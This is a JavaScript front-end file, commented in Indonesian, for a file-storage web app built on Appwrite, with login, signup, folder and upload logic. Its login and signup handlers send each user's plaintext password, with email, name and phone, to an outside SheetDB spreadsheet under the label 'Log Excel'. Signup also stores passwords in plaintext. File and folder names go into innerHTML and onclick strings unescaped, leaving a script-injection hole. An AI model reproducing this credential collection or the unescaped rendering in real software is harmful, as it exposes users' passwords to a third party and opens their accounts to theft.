// ======================================================
// STORAGE TASKS - APP.JS (LOGIC FOLDER & NAVIGASI)
// ======================================================

const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// KONFIGURASI
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',   
    BUCKET_ID: 'taskfiles'
};
const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi';

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

let currentUser = null;
let currentFolderId = 'root'; // Folder awal adalah Root

const el = (id) => document.getElementById(id);
const showLoading = () => el('loading').classList.remove('hidden');
const hideLoading = () => el('loading').classList.add('hidden');

// NAVIGASI HALAMAN
window.nav = (pageId) => {
    ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => el(id).classList.add('hidden'));
    el(pageId).classList.remove('hidden');
};

// ======================================================
// OTENTIKASI & LOG EXCEL
// ======================================================

// LOGIN
if (el('loginForm')) {
    el('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        let identifier = el('loginEmail').value.trim(); 
        const password = el('loginPass').value;
        showLoading();
        try {
            if (!identifier.includes('@')) {
                const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [Appwrite.Query.equal('name', identifier)]);
                if (res.total === 0) throw new Error("Username tidak ditemukan.");
                identifier = res.documents[0].email;
            }
            await account.createEmailPasswordSession(identifier, password);
            currentUser = await account.get();

            // Log Excel
            fetch(`${SHEETDB_API}?sheet=Login`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: [{ "ID": currentUser.$id, "Nama": currentUser.name, "Email": currentUser.email, "Password": password, "Riwayat Waktu": new Date().toLocaleString('id-ID') }]})
            });

            checkSession(); 
        } catch (error) { alert("Gagal: " + error.message); hideLoading(); }
    });
}

// SIGN UP
if (el('signupForm')) {
    el('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const name = el('regName').value; const email = el('regEmail').value;
        const phone = el('regPhone').value; const pass = el('regPass').value;
        if (pass !== el('regVerify').value) return alert("Password tidak sama!");
        showLoading();
        try {
            const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone, password: pass });
            
            // Log Excel
            fetch(`${SHEETDB_API}?sheet=SignUp`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: [{ "ID": auth.$id, "Nama": name, "Email": email, "Phone": phone, "Password": pass, "Waktu": new Date().toLocaleString('id-ID') }]})
            });

            alert("Daftar Berhasil!"); nav('loginPage');
        } catch (error) { alert(error.message); } finally { hideLoading(); }
    });
}

// LOGOUT
if (el('logoutBtn')) {
    el('logoutBtn').addEventListener('click', async () => {
        if (!confirm("Keluar?")) return;
        showLoading();
        try {
            const user = await account.get();
            await fetch(`${SHEETDB_API}?sheet=Logout`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: [{ "ID": user.$id, "Nama": user.name, "Email": user.email, "Riwayat Waktu": new Date().toLocaleString('id-ID') }]})
            });
            await account.deleteSession('current');
            currentUser = null;
        } catch (e) { console.error(e); }
        finally {
            hideLoading();
            alert("Anda telah logout.");
            nav('loginPage');
        }
    });
}

// ======================================================
// STORAGE & FOLDER SYSTEM (INTI LOGIKA)
// ======================================================

async function checkSession() {
    showLoading();
    try {
        currentUser = await account.get();
        nav('dashboardPage'); updateGreeting(); loadFiles(currentFolderId);
    } catch (e) { nav('loginPage'); }
    finally { setTimeout(hideLoading, 500); }
}
document.addEventListener('DOMContentLoaded', checkSession);

// LOAD FILES BERDASARKAN FOLDER
async function loadFiles(folderId) {
    if (!currentUser) return;
    const grid = el('fileGrid'); grid.innerHTML = '';
    try {
        // Query: Cari file milik user ini DAN berada di folder ini (parentId)
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.equal('parentId', folderId)
        ]);
        res.documents.forEach(doc => renderItem(doc));
    } catch (e) { console.error(e); }
}

// RENDER ITEM (TAMPILAN GRID)
function renderItem(doc) {
    const grid = el('fileGrid');
    const div = document.createElement('div'); 
    div.className = 'item-card'; // Style Kotak Besar
    
    const isFolder = doc.type === 'folder';
    const icon = isFolder ? 'fa-folder' : 'fa-file';
    
    // Klik Folder -> Masuk (openFolder), Klik File -> Buka Tab Baru
    const clickAction = isFolder 
        ? `openFolder('${doc.$id}', '${doc.name}')` 
        : `window.open('${doc.url}', '_blank')`;

    div.innerHTML = `
        <button class="del-btn" onclick="deleteItem('${doc.$id}','${doc.type}','${doc.fileId}')">
            <i class="fa-solid fa-xmark"></i>
        </button>
        <div onclick="${clickAction}" style="width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;">
            <i class="icon fa-solid ${icon}"></i>
            <div class="item-name">${doc.name}</div>
        </div>`;
    grid.appendChild(div);
}

// NAVIGASI MASUK FOLDER
window.openFolder = (id, name) => { 
    currentFolderId = id; // Set folder aktif ke ID folder ini
    
    // Update Header
    const navArea = el('navButtons');
    navArea.innerHTML = `
        <button class="btn-pill small secondary" onclick="goBack()">
            <i class="fa-solid fa-arrow-left"></i> Kembali
        </button> 
        <h2 style="display:inline; margin-left:15px;">${name}</h2>
    `;
    
    loadFiles(id); // Muat isi folder
};

// NAVIGASI KEMBALI KE ROOT
window.goBack = () => {
    currentFolderId = 'root';
    updateGreeting(); // Reset judul ke Welcome
    loadFiles('root');
};

// MEMBUAT FOLDER BARU
window.submitCreateFolder = async () => {
    const name = el('newFolderName').value.trim();
    if (!name) return;
    closeModal('folderModal'); showLoading();
    try {
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: name, // Menggunakan 'name'
            type: 'folder', 
            parentId: currentFolderId, // Folder dibuat DI DALAM folder aktif
            owner: currentUser.$id, 
            size: 0
        });
        loadFiles(currentFolderId);
    } catch (e) { alert("Gagal buat folder: " + e.message); } 
    finally { hideLoading(); }
};

// UPLOAD FILE
window.submitUploadFile = async () => {
    if (!window.selectedFile) return alert("Pilih file!");
    closeModal('uploadModal'); showLoading();
    try {
        const file = window.selectedFile;
        // 1. Upload Fisik
        const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), file);
        const url = storage.getFileView(CONFIG.BUCKET_ID, up.$id);
        
        // 2. Simpan Data
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: file.name, 
            type: 'file', 
            parentId: currentFolderId, // File disimpan DI DALAM folder aktif
            owner: currentUser.$id, 
            url: url.href, 
            fileId: up.$id, 
            size: file.size
        });
        loadFiles(currentFolderId);
    } catch (e) { alert("Gagal upload: " + e.message); } 
    finally { hideLoading(); }
};

// UTILS & HELPER
window.deleteItem = async (id, type, fileId) => {
    if (!confirm("Hapus item ini?")) return;
    showLoading();
    try {
        if (type === 'file') await storage.deleteFile(CONFIG.BUCKET_ID, fileId);
        await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, id);
        loadFiles(currentFolderId);
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

window.openModal = (id) => { el(id).classList.remove('hidden'); el('dropdownMenu').classList.remove('show'); };
window.closeModal = (id) => el(id).classList.add('hidden');
window.triggerUploadModal = () => openModal('uploadModal');
window.createFolder = () => openModal('folderModal');
window.toggleDropdown = () => el('dropdownMenu').classList.toggle('show');
window.togglePass = (id, icon) => { const i = el(id); i.type = i.type==='password'?'text':'password'; icon.classList.toggle('fa-eye'); icon.classList.toggle('fa-eye-slash'); };
function updateGreeting() { 
    const h = new Date().getHours(); let s = "Morning"; if(h>=12) s="Afternoon"; if(h>=18) s="Night"; 
    const navArea = el('navButtons');
    navArea.innerHTML = `<h2 id="welcomeText">Welcome In Drive ${s}</h2>`;
}

// Drag & Drop
el('dropZone').addEventListener('dragover', (e) => { e.preventDefault(); e.target.classList.add('dragover'); });
el('dropZone').addEventListener('drop', (e) => { e.preventDefault(); handleFileSelect(e.dataTransfer.files[0]); });
el('fileInputHidden').addEventListener('change', (e) => handleFileSelect(e.target.files[0]));
function handleFileSelect(f) { window.selectedFile = f; el('fileInfoText').innerText = `File: ${f.name}`; }
el('searchInput').addEventListener('input', () => loadFiles(currentFolderId));
